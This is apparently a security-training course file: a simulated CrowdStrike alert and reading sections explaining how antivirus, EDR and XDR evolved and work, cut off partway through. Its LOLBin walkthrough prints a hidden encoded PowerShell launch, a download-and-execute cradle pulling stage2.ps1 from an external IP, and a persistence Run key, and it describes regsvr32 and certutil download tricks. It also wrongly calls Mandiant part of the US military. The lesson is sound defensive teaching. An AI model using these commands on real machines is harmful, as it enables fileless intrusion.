import type { TelemetryEvent } from "@/lib/sim/types";

const edrInjectEvent: TelemetryEvent = {
  id: "evt-edr-inject-001",
  ts: "2024-09-18T11:27:44.000Z",
  source: "edr",
  vendor: "CrowdStrike Falcon",
  event_type: "edr_alert",
  severity: "critical",
  hostname: "WS-EXEC-022",
  user_email: "d.sharon@medcorehealth.org",
  description:
    "CRITICAL: Malicious Office macro spawned PowerShell which injected shellcode into explorer.exe",
  mitre_technique: "T1055.002",
  mitre_tactic: "Defense Evasion",
  process: {
    name: "powershell.exe",
    pid: 9944,
    path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    parent_name: "WINWORD.EXE",
    parent_pid: 6312,
    cmdline:
      "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",
    user: "MEDCORE\\d.sharon",
    integrity: "high" as const,
  },
  raw: {
    "event.module": "crowdstrike",
    "event.dataset": "crowdstrike.falcon",
    "crowdstrike.event.EventType": "DetectionSummaryEvent",
    "crowdstrike.event.DetectId": "ldt:c3b1f2a4e5d6:9988776655",
    "crowdstrike.event.DetectDescription":
      "A process opened a handle to another running process with elevated access rights",
    "crowdstrike.event.Tactic": "Defense Evasion",
    "crowdstrike.event.TacticId": "TA0005",
    "crowdstrike.event.Technique": "Process Injection",
    "crowdstrike.event.TechniqueId": "T1055",
    "crowdstrike.event.Severity": "4",
    "crowdstrike.event.SeverityName": "Critical",
    "crowdstrike.event.FileName": "powershell.exe",
    "crowdstrike.event.CommandLine":
      "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",
    "crowdstrike.event.ParentImageFileName": "WINWORD.EXE",
    "crowdstrike.event.ParentCommandLine":
      "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n contract_2024.docm",
    "crowdstrike.event.TargetProcessId": "3128",
    "crowdstrike.event.GrantedAccess": "0x1FFFFF",
    "crowdstrike.event.IOCType": "hash_sha256",
    "crowdstrike.event.IOCValue":
      "7f3e1c9b8a2d4f6e0c5b3a1d9f7e5c2b4a6d8f0e3c1b5a7d9f2e4c6b8a0d3e5f",
    "crowdstrike.event.NetworkContainmentState": "Not Contained",
    "crowdstrike.event.MachineDomain": "MEDCORE",
  },
};

const avVsEdrMasterclass = {
  id: "av-vs-edr-masterclass",
  title: "Antivirus vs EDR vs XDR: Endpoint Security Evolution",
  description:
    "Master the full evolution of endpoint security — from 1987 signature-based antivirus to modern XDR platforms. Learn how EDR hooks the OS kernel, why fileless malware defeats AV, and how to analyze real CrowdStrike Falcon alerts in a hospital environment.",
  difficulty: "intermediate" as const,
  category: "Endpoint Security",
  estimatedMinutes: 70,
  xp: 650,
  icon: "🛡️",
  prerequisites: ["endpoint-security-fundamentals"],
  tasks: [
    // ── Reading 1 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r1",
      heading: "The History of Endpoint Security: From 1987 to Today",
      content:
        "To understand why modern endpoint security is built the way it is, you need to understand the arms race that created it. Every feature in today's EDR platforms exists because an attacker found a way to defeat the previous generation of tools.\n\n" +
        "The story begins in 1986 with Brain, the first PC virus. Brain was a boot-sector virus that two Pakistani brothers, Basit and Amjad Farooq Alvi, wrote to protect their medical software from piracy. It was not destructive — it just spread. But it proved that programs could replicate and spread across machines without users knowing.\n\n" +
        "One year later, in 1987, German programmer Bernd Fix wrote the first documented antivirus program to remove a virus called Vienna. The concept was simple: scan files for known malicious patterns. The signature era was born.\n\n" +
        "Through the 1990s, antivirus became a commercial industry. Norton AntiVirus and McAfee VirusScan became household names. Their approach was the same: maintain a database of known malware signatures (specific byte patterns found in malicious files), scan every file against the database, and quarantine anything that matches. This worked beautifully against the commodity viruses of that era, because most malware was the same binary distributed to thousands of victims.\n\n" +
        "The cracks started showing in the early 2000s. Polymorphic viruses could rewrite their own code on each infection, changing their byte patterns while preserving their function. Metamorphic viruses went further, rewriting their logic entirely. Signature-based scanners struggled because each variant looked different to the database.\n\n" +
        "In 2003, SQL Slammer spread so fast it brought down large portions of the internet in minutes. In 2004, Blaster and Sasser worms infected hundreds of thousands of Windows machines. Signature databases could not be updated fast enough to keep up with the volume.\n\n" +
        "Then came 2010 and Stuxnet — a watershed moment. Stuxnet was a nation-state cyberweapon targeting Iranian nuclear centrifuges. It used four zero-day vulnerabilities simultaneously, was signed with stolen digital certificates, and targeted Siemens industrial control software with extreme precision. When security researchers first found it, no antivirus had a signature for it. It had been operating undetected for years. Stuxnet proved that signature-based AV was fundamentally unable to stop targeted attacks.\n\n" +
        "Between 2011 and 2015, the Advanced Persistent Threat (APT) era revealed just how invisible skilled attackers could be. Groups like APT1 (Chinese military unit 61398) spent years inside corporate networks, completely invisible to AV scanners. The US military's Mandiant team published its famous APT1 report in 2013 documenting over 141 compromised companies. That same year, Anton Chuvakin at Gartner coined the term EDR — Endpoint Detection and Response — to describe the new category of tools needed to find attackers already inside the network.\n\n" +
        "In 2016, the Mirai botnet demonstrated a new threat: IoT devices (cameras, routers, DVRs) infected at massive scale to launch the largest DDoS attacks ever recorded. In 2017, NotPetya destroyed billions of dollars of infrastructure globally. NotPetya was fileless in its lateral movement phase — it spread via stolen Windows credentials and never wrote a suspicious file to disk, bypassing AV entirely.\n\n" +
        "By 2018, the XDR (Extended Detection and Response) concept emerged: instead of detecting threats at just the endpoint, correlate signals from endpoints, network, email, and cloud into a unified detection platform. This is where the industry stands today.",
      codeExample:
        "ENDPOINT SECURITY TIMELINE\n" +
        "==========================\n\n" +
        "1986  Brain virus (first PC virus, boot sector)\n" +
        "1987  Bernd Fix writes first AV program (Vienna virus removal)\n" +
        "1990s Norton / McAfee — signature-based AV era begins\n" +
        "      Polymorphic viruses first defeat signatures\n" +
        "2001  Code Red worm — 359,000 machines in 14 hours\n" +
        "2003  SQL Slammer — 75,000 machines in 10 minutes\n" +
        "      Blaster/Sasser worms overwhelm signature updates\n" +
        "2004  Heuristic detection added to mainstream AV\n" +
        "2010  Stuxnet — first nation-state cyberweapon\n" +
        "      No AV signature existed. Operated for years undetected.\n" +
        "2011  APT1 / Shady RAT campaigns targeting Fortune 500\n" +
        "2013  Anton Chuvakin (Gartner) coins 'EDR'\n" +
        "      Mandiant APT1 report: 141 companies breached\n" +
        "2014  Sony Pictures hack — AV misses everything\n" +
        "2015  Carbanak: $1B stolen from banks, AV-invisible\n" +
        "2016  Mirai botnet — IoT DDoS at 1.2 Tbps\n" +
        "2017  NotPetya — fileless lateral movement, AV-bypassing\n" +
        "      WannaCry — global ransomware, EternalBlue exploit\n" +
        "2018  XDR concept emerges (Palo Alto Networks)\n" +
        "2019  CrowdStrike, SentinelOne IPOs — EDR goes mainstream\n" +
        "2020  SolarWinds SUNBURST — supply chain attack\n" +
        "2021  Kaseya VSA — MSP ransomware supply chain\n" +
        "2023  Microsoft XDR + Sentinel unification\n" +
        "2024  AI-native detection engines standard in all EDR\n\n" +
        "KEY LESSON: Every generation of endpoint security was created\n" +
        "to defeat a technique that defeated the previous generation.",
    },

    // ── Reading 2 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r2",
      heading: "How Traditional Antivirus Signature Detection Works",
      content:
        "To understand why traditional antivirus fails against modern attacks, you first need to understand exactly how it works. The core mechanism is simpler than most people expect.\n\n" +
        "Antivirus signature detection is essentially a fingerprinting system. When a malware analyst discovers a new piece of malware, they study it and extract a unique identifier — a fingerprint — that can reliably distinguish this malware from legitimate software. This fingerprint is the signature.\n\n" +
        "There are two primary types of signatures. The first is a hash signature: the AV vendor computes the SHA256 or MD5 hash of the complete malware file and adds it to the database. When the AV scanner encounters any file, it computes that file's hash and looks it up in the database. If the hash matches a known-bad entry, the file is flagged. This is 100% accurate but completely brittle — change even one byte of the file and the hash changes entirely, defeating the detection.\n\n" +
        "The second type is a byte-pattern signature: instead of hashing the entire file, the analyst identifies a specific sequence of bytes at a known offset inside the malicious file. For example, the malware might always contain the string 'xorkey=0x13' at offset 0x4A0. The AV scanner reads the file in chunks and looks for this exact byte sequence. Byte-pattern signatures are more flexible than hash signatures because minor variations in the file may not change the targeted region, but they require careful crafting to avoid false positives.\n\n" +
        "The signature database is built through a pipeline. Security researchers and honeypots collect malware samples. Automated systems detonate the samples in sandboxes and extract signatures. Human analysts verify the signatures. The verified signatures are packaged into a signature update and pushed to all endpoints running that AV product — this is the 'definition update' you see AV products downloading daily.\n\n" +
        "AV scanning operates in two modes. On-access scanning (also called real-time protection) intercepts every file access — when you open, copy, or download a file, the AV scans it before it can execute. This is the primary prevention mechanism. On-demand scanning is a scheduled or manual full scan of all files on the system, looking for infections that may have slipped through.\n\n" +
        "When a signature match is found, the AV quarantines the file: it moves the file to an isolated folder (typically C:\\\\ProgramData\\\\[AV vendor]\\\\Quarantine\\\\) where it cannot execute, and records the detection. The user or administrator can then review and either restore (false positive) or permanently delete the file.\n\n" +
        "How effective is this? Against commodity malware — ransomware strains and banking trojans that are distributed to tens of thousands of victims using the same binary — signature AV catches the vast majority once signatures exist. Against custom-built malware written specifically for your organization, or against any malware in the first hours before signatures are published, the catch rate is effectively zero.\n\n" +
        "This is why the security industry often calls AV effective against 'yesterday's attacks' but not today's. Signatures are reactive by definition — you cannot write a signature for something you have not yet seen.",
      codeExample:
        "ANTIVIRUS SIGNATURE DETECTION PROCESS\n" +
        "======================================\n\n" +
        "STEP 1 — FILE ACCESS TRIGGER\n" +
        "  User opens: contract_2024.docm\n" +
        "  OS notifies AV mini-filter driver (on-access hook)\n\n" +
        "STEP 2 — HASH COMPUTATION\n" +
        "  AV computes: SHA256(contract_2024.docm)\n" +
        "  Result:      a3f7c2e1b9d4f6a8c0e2d5b7f9a1c3e5d7b9f2a4c6e8b0d2f4a6c8e0b2d4f6a8\n\n" +
        "STEP 3 — HASH DATABASE LOOKUP\n" +
        "  Query local signature DB:\n" +
        "  SHA256 = a3f7c2e1b9d4f6a8c0e2d5b7f9a1c3e5d7b9f2a4c6e8b0d2f4a6c8e0b2d4f6a8\n" +
        "  Result: NO MATCH (new/unknown file)\n\n" +
        "STEP 4 — BYTE PATTERN SCAN\n" +
        "  Scan file bytes for known patterns:\n" +
        "  Offset 0x000: 4D 5A 90 00  -> MZ header (PE executable)\n" +
        "  Offset 0x4A0: scan for known malware byte sequences...\n" +
        "  Result: NO MATCH\n\n" +
        "STEP 5 — DECISION\n" +
        "  No hash match + No pattern match = FILE ALLOWED\n" +
        "  contract_2024.docm opens in Microsoft Word.\n" +
        "  Embedded macro executes. Malware runs.\n\n" +
        "----------------------------------------------\n" +
        "WHY IT FAILED:\n" +
        "  This was a custom-built macro, never seen before.\n" +
        "  No signature existed. AV was blind.\n\n" +
        "COMMODITY MALWARE (same binary, 10,000 victims):\n" +
        "  SHA256 IS in database -> QUARANTINED immediately\n" +
        "  AV works perfectly against this threat type.",
    },

    // ── Reading 3 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r3",
      heading: "Beyond Signatures: Heuristics, Sandboxing, and Machine Learning in AV",
      content:
        "The security industry recognized the signature problem in the late 1990s and began developing complementary detection methods. These methods try to identify malware not by what it looks like (its exact bytes) but by what it does or what characteristics it has.\n\n" +
        "Static heuristics analyze a file without executing it. The AV examines the file's structure and properties to look for characteristics that are common in malware but rare in legitimate software. Key indicators examined include: PE header anomalies (sections with unusual names, unusual section permissions like executable+writable), suspicious API imports (a file that imports VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread together is almost certainly trying to inject into another process), and code entropy.\n\n" +
        "Entropy is particularly important. Entropy measures the randomness of data on a scale from 0 (completely predictable) to 8.0 (completely random). A text file has low entropy. A compressed or encrypted file has entropy close to 8.0 — because compressed and encrypted data looks random. Malware that packs or encrypts its payload to evade signature detection must store that encrypted blob somewhere in the file, and that section will have very high entropy. Legitimate executables almost never have sections with entropy above 7.2.\n\n" +
        "Dynamic heuristics (sandboxing) take a different approach: instead of analyzing the file statically, execute it in an isolated virtual environment and observe what it actually does. A sandbox monitors system calls, file operations, registry modifications, and network connections made by the sample. If the sample drops another executable, connects to an IP not in the Alexa top 1 million, or attempts to inject into another process — it is flagged as malicious.\n\n" +
        "Commercial sandbox services include Any.run (interactive cloud sandbox), Joe Sandbox (deep behavioral analysis), Hybrid Analysis (free service powered by Falcon Sandbox), and Cuckoo (open-source, self-hosted). Many enterprise AV and email gateway products integrate sandboxing: suspicious files are automatically submitted for analysis before being delivered.\n\n" +
        "Machine learning adds a third layer. AV vendors train models on millions of labeled samples — files that are known malicious and files that are known benign. The model learns to identify combinations of features (not any single indicator, but the combination) that predict maliciousness. Modern ML models can achieve very high accuracy on novel samples they have never seen before, because they have generalized the patterns of malicious behavior rather than memorizing specific signatures.\n\n" +
        "The critical challenge with all three methods is false positives. A legitimate software developer who packs their installer with a compression tool to reduce download size will have high entropy sections. A legitimate security tool that inspects process memory will import the same APIs as an injector. A legitimate enterprise application that calls home to an internal server may look like C2 communication to a sandbox. Overly aggressive heuristics flood analysts with false alarms, creating alert fatigue that is itself a security risk.",
      codeExample:
        "ENTROPY COMPARISON: LEGITIMATE vs PACKED MALWARE\n" +
        "==================================================\n\n" +
        "LEGITIMATE EXECUTABLE (calc.exe, Windows Calculator)\n" +
        "  Section    Size      Entropy   Notes\n" +
        "  .text      89,600    6.14      Code — moderate entropy (normal)\n" +
        "  .data      4,096     4.23      Initialized data — lower entropy\n" +
        "  .rsrc      45,056    5.87      Resources — images, strings\n" +
        "  Overall:   6.08      LOW-MEDIUM -> Likely benign\n\n" +
        "PACKED MALWARE (ransomware dropper)\n" +
        "  Section    Size      Entropy   Notes\n" +
        "  .text      512       3.10      Tiny stub (just the unpacker)\n" +
        "  .data      147,456   7.94      ENCRYPTED PAYLOAD (near-random)\n" +
        "  .rsrc      128       1.20      Minimal resources (fake)\n" +
        "  Overall:   7.71      VERY HIGH -> Suspicious, likely packed\n\n" +
        "HEURISTIC THRESHOLDS (typical AV settings)\n" +
        "  Entropy > 7.2 in any section  -> Flag for review\n" +
        "  Entropy > 7.6                 -> High confidence malicious\n" +
        "  Entropy > 7.9                 -> Almost certainly encrypted payload\n\n" +
        "SANDBOX BEHAVIORAL INDICATORS (malicious activity)\n" +
        "  CreateRemoteThread into another process     -> Process injection\n" +
        "  WriteProcessMemory to lsass.exe             -> Credential dumping\n" +
        "  Registry write to HKLM\\Software\\...\\Run    -> Persistence\n" +
        "  DNS query to newly registered domain        -> C2 communication\n" +
        "  Enumerate shadow copies + vssadmin.exe      -> Ransomware prep\n\n" +
        "NOTE: High entropy alone is NOT proof of malice.\n" +
        "Legitimate packers (UPX) are widely used by benign software.\n" +
        "Context matters: entropy + suspicious APIs + no valid signature\n" +
        "= very high confidence of malicious packing.",
    },

    // ── Reading 4 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r4",
      heading: "Why AV Is Not Enough: Fileless Malware and Living-Off-the-Land Attacks",
      content:
        "Sophisticated attackers in the 2010s made a critical observation: antivirus scans files. If your attack never writes a malicious file to disk, AV has nothing to scan.\n\n" +
        "Fileless malware operates entirely in memory. The malware payload is injected directly into a running process, stored in the registry, or loaded via a document macro that executes PowerShell commands. There is never a standalone .exe or .dll on disk that AV could scan. When the machine reboots, the malware is gone from memory — but it has already done its damage, or it has established persistence in ways that do not involve traditional files (such as encoded commands in the registry that execute at startup).\n\n" +
        "The most powerful evolution of fileless malware is the Living-Off-the-Land (LOL) technique. Instead of bringing their own malicious tools, attackers abuse legitimate programs that are already installed on every Windows machine and trusted by AV. These are called LOLBins — Living-Off-the-Land Binaries.\n\n" +
        "Every SOC analyst must know these LOLBins and what attackers use them for:\n\n" +
        "powershell.exe: The most abused LOLBin. Can download files, execute code from memory, interact with COM objects, query WMI, and access .NET classes. The -enc flag allows base64-encoded command payloads. cmd.exe: Basic command execution, pipe chaining, launching other LOLBins. wscript.exe and cscript.exe: Execute VBScript and JScript files — attackers email .vbs or .js attachments that run via wscript. mshta.exe: Executes HTML Applications (.hta files), which are full-featured scripts with COM access. Attackers host malicious HTA files on their servers and make victims run them. regsvr32.exe: Registers COM DLLs, but can also download and execute a remote scriptlet file via the /s /n /u /i:[URL] flags — this bypasses application whitelisting. certutil.exe: A certificate management tool that can decode base64 files (certutil -decode malware.b64 malware.exe) and download files from URLs. bitsadmin.exe: The Background Intelligent Transfer Service command-line tool, used by Windows Update — abused to download files in the background. wmic.exe: Windows Management Instrumentation command line — can execute processes, query system information, and even execute remote commands. rundll32.exe: Loads and executes DLL files, including executing specific exported functions — attackers use it to run malicious DLLs without creating a new process.\n\n" +
        "The attack chain using LOLBins typically looks like this: a user opens a malicious Word document with an embedded macro. The macro is not blocked by AV because it runs inside WINWORD.EXE. The macro calls out to PowerShell using a base64-encoded, hidden command string. PowerShell connects to the attacker's server and downloads a payload — but into memory, not to disk. The payload runs inside PowerShell's process. Everything that happened was carried out by signed, trusted Microsoft tools. AV sees nothing suspicious.\n\n" +
        "This is why EDR was invented. EDR does not just scan files — it watches what processes do, who spawns what, what network connections are made, and what data is accessed. When PowerShell is spawned by Word and immediately connects to an external IP, an EDR flags this as suspicious regardless of whether there are any malicious files on disk.",
      codeExample:
        "LOLBIN ATTACK CHAIN: OFFICE MACRO -> FILELESS EXECUTION\n" +
        "=========================================================\n\n" +
        "STEP 1 — Initial Access\n" +
        "  User receives email: 'contract_2024.docm'\n" +
        "  User opens file in Microsoft Word (WINWORD.EXE, pid 6312)\n" +
        "  Macro auto-runs: Document_Open()\n" +
        "  AV STATUS: No malicious file -> NO DETECTION\n\n" +
        "STEP 2 — LOLBin Execution (PowerShell)\n" +
        "  WINWORD.EXE spawns:\n" +
        "  powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAt...\n" +
        "  |                 |    |        |\n" +
        "  |                 |    |        +-- base64-encoded payload\n" +
        "  |                 |    +----------- WindowStyle Hidden\n" +
        "  |                 +---------------- NoProfile (bypass logging)\n" +
        "  +---------------------------------- PowerShell (trusted LOLBin)\n" +
        "  AV STATUS: powershell.exe is trusted -> NO DETECTION\n\n" +
        "STEP 3 — In-Memory Download Cradle (decoded payload)\n" +
        "  IEX(New-Object Net.WebClient).DownloadString(\n" +
        "    'http://185.220.101.50/stage2.ps1'\n" +
        "  )\n" +
        "  Payload downloaded into memory, never written to disk.\n" +
        "  AV STATUS: No file to scan -> NO DETECTION\n\n" +
        "STEP 4 — Process Injection\n" +
        "  PowerShell injects shellcode into explorer.exe (pid 3128)\n" +
        "  VirtualAllocEx + WriteProcessMemory + CreateRemoteThread\n" +
        "  AV STATUS: No new file, no signature match -> NO DETECTION\n\n" +
        "STEP 5 — C2 Communication\n" +
        "  Shellcode in explorer.exe connects to C2 server\n" +
        "  Beacon: every 60 seconds, HTTPS to 185.220.101.50:443\n" +
        "  AV STATUS: explorer.exe is trusted -> NO DETECTION\n\n" +
        "EDR STATUS (if deployed):\n" +
        "  ALERT: Word spawning PowerShell with -enc flag\n" +
        "  ALERT: PowerShell downloading from external IP\n" +
        "  ALERT: PowerShell writing to explorer.exe process memory\n" +
        "  ALERT: GrantedAccess 0x1FFFFF on target process\n" +
        "  -> CRITICAL DETECTION, host isolated",
    },

    // ── Reading 5 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r5",
      heading: "What Is EDR? Endpoint Detection and Response Explained",
      content:
        "EDR — Endpoint Detection and Response — is a category of security software that continuously monitors every action taken on an endpoint and records it in a central database for analysis. The key word is 'continuously': unlike AV, which only scans when files are accessed, EDR watches everything that happens on the machine at all times.\n\n" +
        "Think of the difference this way. Traditional AV is like a guard at a door who checks IDs against a list of known criminals. EDR is like a complete surveillance system that records every person's movements through the entire building — who entered which room, who touched which object, who spoke to whom. Even if someone without a criminal record commits a crime, the recording captures exactly what they did.\n\n" +
        "What EDR monitors that AV does not:\n\n" +
        "Process creation trees: Every time a process is created, EDR records the parent process, the child process, the command line, the user account, and the integrity level. This creates a chain: cmd.exe spawned powershell.exe which spawned net.exe — and you can see the full ancestry of every process running on the machine.\n\n" +
        "Network connections: Every TCP or UDP connection made by every process is recorded, with the destination IP, port, protocol, and bytes transferred. When malware calls home to a C2 server, this appears in the EDR telemetry tagged to the specific process that made the connection.\n\n" +
        "File system changes: Every file created, modified, renamed, or deleted is recorded with the process responsible. When ransomware encrypts thousands of files, EDR sees every single file operation, tagged to the process doing it.\n\n" +
        "Registry modifications: Malware commonly writes to the registry for persistence. EDR records every registry key write, with the process that performed it.\n\n" +
        "DLL loads: Every dynamic library loaded into every process is recorded. If malware loads a malicious DLL, EDR captures it.\n\n" +
        "Memory operations: Suspicious operations like VirtualAllocEx (allocating memory in another process) and WriteProcessMemory (writing to another process) are flagged — these are the API calls used for process injection.\n\n" +
        "All of this telemetry streams continuously to a cloud or on-premises analysis platform. Detection rules and machine learning models analyze the telemetry in real time and generate alerts when attack patterns are detected.\n\n" +
        "Response capabilities are what separate EDR from passive monitoring. When an attack is confirmed, EDR can: isolate the host (cut all network connections while maintaining the EDR agent's communication for investigation), kill a specific process, delete a specific file, or roll back file system changes (some EDR platforms maintain shadow copies of original files to reverse ransomware encryption).\n\n" +
        "It is important to understand the distinction between EPP and EDR. EPP (Endpoint Protection Platform) is the prevention layer: antivirus, host firewall, device control, application control. EPP tries to stop threats before they execute. EDR is the detection and response layer: assumes some threats will get through and focuses on detecting them once they are active. Most modern endpoint security products combine both layers — CrowdStrike Falcon, for example, includes both Falcon Prevent (EPP) and Falcon Insight (EDR) in the same sensor.",
      codeExample:
        "EDR TELEMETRY STREAMS — WHAT FLOWS TO THE CLOUD\n" +
        "==================================================\n\n" +
        "ENDPOINT: WS-EXEC-022\n" +
        "EDR AGENT: CrowdStrike Falcon Sensor 7.15\n\n" +
        "STREAM 1: PROCESS EVENTS\n" +
        "  ts=11:27:39  WINWORD.EXE (pid 6312) created by EXPLORER.EXE\n" +
        "               cmdline: WINWORD.EXE /n contract_2024.docm\n" +
        "  ts=11:27:44  powershell.exe (pid 9944) created by WINWORD.EXE\n" +
        "               cmdline: powershell.exe -nop -w hidden -enc ...\n" +
        "               integrity: High\n" +
        "  [ALERT] Office application spawning PowerShell with -enc\n\n" +
        "STREAM 2: NETWORK EVENTS\n" +
        "  ts=11:27:47  powershell.exe (pid 9944)\n" +
        "               dst=185.220.101.50:443 proto=tcp bytes_out=412\n" +
        "  [ALERT] PowerShell making outbound HTTPS connection\n\n" +
        "STREAM 3: MEMORY OPERATION EVENTS\n" +
        "  ts=11:27:51  powershell.exe (pid 9944)\n" +
        "               VirtualAllocEx -> target pid 3128 (explorer.exe)\n" +
        "               WriteProcessMemory -> target pid 3128\n" +
        "               CreateRemoteThread -> target pid 3128\n" +
        "               GrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)\n" +
        "  [ALERT] Process injection into explorer.exe DETECTED\n\n" +
        "STREAM 4: FILE EVENTS\n" +
        "  ts=11:27:44  No suspicious files written\n" +
        "               (fileless attack — payload in memory only)\n\n" +
        "STREAM 5: REGISTRY EVENTS\n" +
        "  ts=11:27:55  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\\n" +
        "               Run -> 'svchost32' = 'C:\\ProgramData\\svc32.bat'\n" +
        "  [ALERT] Persistence registry key written by explorer.exe\n\n" +
        "CLOUD ANALYSIS RESULT:\n" +
        "  Severity: CRITICAL\n" +
        "  Technique: T1055.002 Process Injection (Portable Executable Injection)\n" +
        "  Recommended action: Network Contain WS-EXEC-022",
    },

    // ── Reading 6 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r6",
      heading: "How EDR Hooks the Operating System: Kernel Drivers and ETW",
      content:
        "For EDR to see everything happening on an endpoint, it needs deep integration with the operating system. The OS is the foundation that all software runs on — and EDR must be able to observe every OS operation. This is achieved through a combination of kernel-mode drivers and Windows telemetry APIs.\n\n" +
        "Windows has two execution modes. User mode (Ring 3) is where normal applications run — Word, Chrome, PowerShell. Kernel mode (Ring 0) is where the Windows kernel runs — the core OS code that manages memory, processes, and hardware. Code in kernel mode can see and control everything. Code in user mode can only see itself and what the OS explicitly gives it permission to see.\n\n" +
        "To truly monitor the OS, EDR vendors install a kernel-mode driver — a component that runs at Ring 0 alongside the Windows kernel itself. From this position, the EDR driver can intercept operating system operations as they happen, before they complete.\n\n" +
        "Microsoft provides official, documented mechanisms for this — these are not hacks, but supported APIs designed for security software:\n\n" +
        "PsSetCreateProcessNotifyRoutine: Registers a callback function that Windows calls every time a process is created or terminated anywhere on the system. The EDR driver's callback receives the process information before the new process starts running.\n\n" +
        "ObRegisterCallbacks: Registers callbacks for object access operations — when any process tries to open a handle to another process (a prerequisite for process injection), the EDR callback is invoked and can examine the requested access rights.\n\n" +
        "MiniFilter drivers: A Microsoft-defined framework for intercepting file system operations. EDR uses a minifilter driver to intercept every file create, read, write, and delete operation across all disks. This is how EDR captures file system activity without missing anything.\n\n" +
        "ETW (Event Tracing for Windows) is Microsoft's built-in, high-performance telemetry system. The Windows kernel and many Windows components publish events to ETW channels. EDR vendors subscribe to these channels to receive a rich stream of security-relevant events — including PowerShell execution events, DNS queries, network connections, and kernel operations. Sysmon, the free Microsoft monitoring tool, is essentially a consumer of ETW that makes these events available in the Windows Event Log in a structured format.\n\n" +
        "AMSI (Antimalware Scan Interface) is a critical hook specifically for script-based attacks. When PowerShell, VBScript, JavaScript, or other scripting engines prepare to execute a script, they call the AMSI interface first. Any registered security product (EDR, AV) receives the complete, decoded script content and can decide to block it. This is how EDR catches PowerShell attacks even when the command line is base64-encoded — AMSI receives the decoded script before it executes.\n\n" +
        "Kernel Patch Protection (also called PatchGuard on 64-bit Windows) is Microsoft's defense against unauthorized kernel modifications. It periodically checks kernel data structures for unauthorized changes and triggers a system crash (BSOD) if tampering is detected. EDR vendors must use only the documented, Microsoft-approved callback mechanisms — they cannot simply patch kernel functions directly the way older rootkits did.",
      codeExample:
        "EDR KERNEL ARCHITECTURE: LAYERS OF VISIBILITY\n" +
        "===============================================\n\n" +
        "RING 0 (KERNEL MODE)\n" +
        "+--------------------------------------------------+\n" +
        "| Windows Kernel                                   |\n" +
        "|  +--------------------------------------------+  |\n" +
        "|  | EDR Kernel Driver (e.g., csagent.sys)      |  |\n" +
        "|  |  - PsSetCreateProcessNotifyRoutine         |  |\n" +
        "|  |    -> Called on every process create/exit  |  |\n" +
        "|  |  - ObRegisterCallbacks                     |  |\n" +
        "|  |    -> Called on every process handle open  |  |\n" +
        "|  |  - MiniFilter Driver (filesystem)          |  |\n" +
        "|  |    -> Called on every file operation       |  |\n" +
        "|  +--------------------------------------------+  |\n" +
        "|                                                  |\n" +
        "|  ETW (Event Tracing for Windows)                 |\n" +
        "|    Providers: Kernel, PowerShell, DNS, WMI...   |\n" +
        "+--------------------------------------------------+\n\n" +
        "RING 3 (USER MODE)\n" +
        "+--------------------------------------------------+\n" +
        "| EDR User-Space Agent                             |\n" +
        "|  - Receives events from kernel driver            |\n" +
        "|  - Subscribes to ETW channels                   |\n" +
        "|  - AMSI provider (hooks PowerShell/VBScript)    |\n" +
        "|  - Applies detection rules locally              |\n" +
        "|  - Streams telemetry to cloud                   |\n" +
        "+--------------------------------------------------+\n" +
        "| AMSI Hook in PowerShell.exe                      |\n" +
        "|  Before: powershell.exe -enc SQBFAFgA...        |\n" +
        "|  After decoding: IEX(New-Object Net.WebClient)  |\n" +
        "|  AMSI receives DECODED script -> can block it   |\n" +
        "+--------------------------------------------------+\n\n" +
        "PATCHGUARD (KPP) — What EDR CANNOT Do:\n" +
        "  X Directly patch kernel function pointers (SSDT hooking)\n" +
        "  X Modify kernel data structures without approval\n" +
        "  X Load unsigned kernel code\n\n" +
        "What EDR MUST Use (Microsoft-approved only):\n" +
        "  OK PsSetCreateProcessNotifyRoutine (documented API)\n" +
        "  OK ObRegisterCallbacks (documented API)\n" +
        "  OK ETW subscriptions (documented API)\n" +
        "  OK MiniFilter framework (documented API)",
    },

    // ── Reading 7 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r7",
      heading: "CrowdStrike Falcon: Architecture, Detection, and Log Fields",
      content:
        "CrowdStrike Falcon is one of the two dominant EDR platforms in enterprise security (alongside Microsoft Defender for Endpoint). Understanding its architecture and log fields is essential for any SOC analyst working in an environment that uses it.\n\n" +
        "The Falcon sensor is a lightweight agent that runs on Windows, macOS, and Linux endpoints. Unlike traditional AV, it has no local signature database to update — it relies primarily on the cloud for analysis. The sensor has two components: a kernel-mode driver that intercepts OS operations, and a user-space process that packages and transmits telemetry to CrowdStrike's cloud.\n\n" +
        "The cloud-side component is called Threat Graph — a massive, cloud-based graph database that links every event from every Falcon sensor across CrowdStrike's 23,000+ customer base. When a technique is seen on one customer's endpoint, the Threat Graph can detect the same technique on any other customer's endpoint immediately. This is what CrowdStrike calls '1-to-1 detection': one customer gets breached, all customers get protection.\n\n" +
        "Smart Filtering is how CrowdStrike manages bandwidth: the sensor does not send every single file access event to the cloud (that would be petabytes of data). Instead, it uses local intelligence to identify which events are anomalous and only transmits those. Normal, expected activity is filtered locally.\n\n" +
        "CrowdStrike's two detection engines work differently from each other. Falcon Prevent is the on-sensor machine learning component — it can block threats without network connectivity, making it effective in air-gapped environments or during network outages. Falcon Insight (the EDR component) is the cloud-based behavioral detection engine that analyzes telemetry streams for attack patterns.\n\n" +
        "The most important conceptual distinction in CrowdStrike is IOC versus IOA:\n\n" +
        "IOC (Indicator of Compromise): Something known-bad — a specific file hash, a known malicious IP address, or a known malicious domain. IOC matching is essentially the same as signature detection. Fast and accurate for known threats, blind to new ones.\n\n" +
